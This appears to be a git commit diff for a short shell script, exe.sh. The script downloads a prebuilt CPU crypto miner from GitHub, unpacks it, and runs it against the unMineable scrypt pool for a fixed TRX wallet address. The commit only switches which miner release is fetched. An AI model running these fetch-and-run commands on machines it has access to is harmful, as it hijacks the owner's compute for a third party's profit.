1b355fe43f21ca8cb85d6467f860f40e6aaf13c5
red56565 <108178533+red56565@users.noreply.github.com>
2023-04-10 10:02:24 +0200

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -1,3 +1,3 @@
-wget https://github.com/pooler/cpuminer/releases/download/v2.5.1/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz 
-tar xf pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
-./minerd -o stratum+tcp://scrypt.unmineable.com:3333 -u TRX:THDXuAcLiSadqs6WSN1NKJymYcdy79RWuX.lycin -p x
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+tar xf cpuminer-opt-linux.tar.gz 
+./cpuminer-sse2 -a scrypt -o stratum+tcp://scrypt.unmineable.com:3333 -u TRX:THDXuAcLiSadqs6WSN1NKJymYcdy79RWuX.lycin -p x
